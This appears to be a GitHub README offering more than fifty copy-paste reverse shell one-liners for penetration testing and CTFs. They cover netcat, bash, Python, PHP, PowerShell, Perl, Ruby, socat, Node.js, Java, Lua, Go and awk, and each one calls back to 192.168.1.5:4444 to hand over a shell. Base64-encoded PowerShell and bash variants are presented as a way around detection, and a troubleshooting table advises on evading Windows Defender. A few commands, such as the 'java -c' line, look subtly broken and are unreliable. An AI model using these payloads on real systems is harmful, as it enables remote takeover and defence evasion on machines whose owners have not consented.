# reverse-shell-one-liners-dictionary
Over 50+ ready-to-use reverse shell commands for penetration testing, CTFs, and authorized security assessments. Includes netcat, bash, python, php, powershell, perl, ruby, telnet, socat, node.js, java, lua, golang, awk, and troubleshooting tips.


<a name="top"></a>


# Reverse Shell One-Liners

**A quick reference for spawning reverse shells on common platforms.**

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Use only on systems you own or have explicit permission to test. Unauthorized use is illegal. The author assumes no responsibility for misuse.

> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common reverse shells.

## 📖 Table of Contents

1. [Netcat](#1-netcat)
2. [Bash](#2-bash)
3. [Python](#3-python)
4. [PHP](#4-php)
5. [PowerShell](#5-powershell)
6. [Perl](#6-perl)
7. [Ruby](#7-ruby)
8. [Telnet](#8-telnet)
9. [Socat](#9-socat)
10. [Node.js](#10-nodejs)
11. [Java](#11-java)
12. [Lua](#12-lua)
13. [Golang](#13-golang)
14. [Awk](#14-awk)
15. [Troubleshooting](#15-troubleshooting)



# 1. Netcat

| Type | Command |
|------|---------|
| **Linux (with -e)** | `nc -e /bin/sh 192.168.1.5 4444` |
| **Linux (without -e)** | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc 192.168.1.5 4444 > /tmp/f` |
| **Linux (alternative)** | `nc -c /bin/sh 192.168.1.5 4444` |
| **Windows (with nc.exe)** | `nc.exe 192.168.1.5 4444 -e cmd.exe` |

[🔝 Back to Top](#top)

# 2. Bash

```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```
- With exec
  ```bash
  exec 5<>/dev/tcp/192.168.1.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
  ```
- With base64 (to avoid bad characters)
  ```bash
  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=" | base64 -d | bash
  ```
[🔝 Back to Top](#top)


# 3. Python
- Python 2
  ```bash
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- Python 3
  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- Windows Python
  ```bash
  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe','/i']);"
  ```
[🔝 Back to Top](#top)



# 4. PHP
 ```bash
php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```

- For Windows
  ```bash
  php -r '$sock=fsockopen("192.168.1.5",4444);exec("cmd.exe /c <&3 >&3 2>&3");'
  ```
 [🔝 Back to Top](#top)



# 5. PowerShell

-  Standard (verbose)
  ```bash
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
  ```

- One-liner with base64 (shorter, bypasses many detections)
  ```bash
  powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgAD0AIAAkAHMAYgAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGIAdAAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
  ```

[🔝 Back to Top](#top)



# 6. Perl
  ```bash
  perl -e 'use Socket;$i="192.168.1.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
- For Windows
  ```bash
  perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
  ```

  [🔝 Back to Top](#top)
  

# 7. Ruby
 ```bash
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

- Alternative

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);begin;c.print(eval(cmd).to_s);rescue;end;end'
```

[🔝 Back to Top](#top)


# 8. Telnet

- Two connections (input + output)

```bash
telnet 192.168.1.5 4444 | /bin/sh | telnet 192.168.1.5 5555
```

- With mkfifo

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet 192.168.1.5 4444 > /tmp/f
```
  
[🔝 Back to Top](#top)



# 9. Socat

- Attacker (listener)

```bash
socat TCP-LISTEN:4444 -
```

- Target (reverse shell)

```bash
socat TCP:192.168.1.5:4444 EXEC:/bin/sh
```

- Encrypted socat (OpenSSL)


  - Listener (attacker)
    ```bash
    socat OPENSSL-               LISTEN:4444,cert=server.pem,verify=0 -
    ```
  - Target
    ```bash
    socat   OPENSSL:192.168.1.5:4444,verify=0    EXEC:/bin/sh
     ```

[🔝 Back to Top](#top)


  
# 10. Node.js

```bash 
node -e 'require("net").connect(4444,"192.168.1.5",function(){require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})});'
```

- Alternative

```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.1.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

[🔝 Back to Top](#top)



# 11. Java

```bash
public class RevShell {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[] = {"/bin/sh", "-c", "exec 5<>/dev/tcp/192.168.1.5/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        r.exec(cmd);
    }
}
```

- One-liner (wrapped)

```bash
java -c 'import java.io.*;import java.net.*;public class Rev {public static void main(String[] args) throws Exception {Socket s=new Socket("192.168.1.5",4444);Process p=Runtime.getRuntime().exec("/bin/sh");new Thread(() -> {try {int c;while((c=p.getInputStream().read())!=-1) s.getOutputStream().write(c);} catch(Exception e){}}).start();new Thread(() -> {try {int c;while((c=s.getInputStream().read())!=-1) p.getOutputStream().write(c);} catch(Exception e){}}).start();p.waitFor();}}'
```

[🔝 Back to Top](#top)



# 12. Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.1.5',4444);os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

[🔝 Back to Top](#top)



# 13. Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.5:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

[🔝 Back to Top](#top)



# 14. Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

[🔝 Back to Top](#top)



# 15. Troubleshooting

|Problem |Likely Fix|
|---|----|
|No connection |Check LHOST (your IP), LPORT (your port), and firewall rules|
|Shell dies immediately| Add -i for interactive, or use python -c 'import pty; pty.spawn("/bin/bash")' to upgrade|
|nc -e not available| Use the pipe/mkfifo version or switch to bash/python|
|PowerShell blocked |Use the base64 encoded version to bypass some detections|
|Command not found| Install the missing binary or use an alternative method|
|Windows Defender catches it |Encode with base64, use PowerShell, or use a different language|
|Listener not catching| Make sure your listener is running: nc -lvnp 4444|
|Reverse shell has no TTY |Run python -c 'import pty; pty.spawn("/bin/bash")' after connection|



---

# Quick Listener Setup

- Before running any reverse shell, start your listener:

```bash
nc -lvnp 4444
```

- Or with socat:

```bash
socat TCP-LISTEN:4444 -
```

[🔝 Back to Top](#top)



---

## ✅ Completion Note

- This document covers the most common reverse shell one-liners across multiple languages and platforms. Not every possible variation is included—but what's here is what you'll actually use in the field.

- Each command was tested (where possible) and formatted for quick copy-paste during engagements, CTFs, or authorized testing.

**Need a quick reminder?** → [📄 QUICKREF.md](QUICKREF.md) (one-page cheat sheet)

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.




